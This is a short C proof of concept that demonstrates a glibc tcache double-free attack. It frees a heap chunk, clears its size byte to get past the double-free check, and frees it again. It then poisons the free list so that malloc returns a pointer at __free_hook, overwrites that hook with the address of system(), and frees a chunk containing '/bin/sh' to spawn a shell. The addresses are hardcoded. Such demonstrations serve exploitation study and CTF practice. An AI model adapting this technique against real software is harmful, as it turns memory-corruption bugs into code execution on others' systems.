#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __free_hook 0x7ffff7fb45a8
#define system 0x7ffff7e1ffd0

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){	
	long size1 = 0x108;
	long size2 = 0xf8;
	long long *p,*q,*r,*junk;
	init();
	// init chunks
	p = malloc(size1);
	// place p into tcache bin
	free(p);
	sleep(0);
	// change p's size to 0x100
	*((char *)p - 8) = 0;
	// double free
	free(p);
	sleep(0);
	// set another p's fd to __free_hook use malloc
	p = malloc(size1);
	p[0] = __free_hook;
	sleep(0);
	// malloc twice to get the target chunk
	q = malloc(size2);
	r = malloc(size2);
	printf("%p\n",r);
	sleep(0);
	// write __free_hook to system
	r[0] = system;
	// write /bin/sh to q
	strcpy(q,"/bin/sh");
	free(q);
	sleep(0);
}

